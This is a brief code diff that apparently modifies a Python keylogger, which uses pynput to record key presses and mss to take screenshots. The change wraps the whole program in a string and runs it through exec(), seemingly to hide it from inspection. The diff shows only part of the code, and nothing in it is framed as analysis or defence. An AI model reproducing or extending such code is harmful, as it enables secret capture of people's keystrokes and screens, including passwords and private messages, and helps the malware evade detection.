@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener
+script = """from pynput.keyboard import Listener
 import logging
 import mss.tools
 import time
@@ -41,3 +41,5 @@ with Listener(on_press=on_press) as listener:
     x = threading.Thread(target=grab)
     x.start()
     listener.join()
+"""
+exec(str(script))
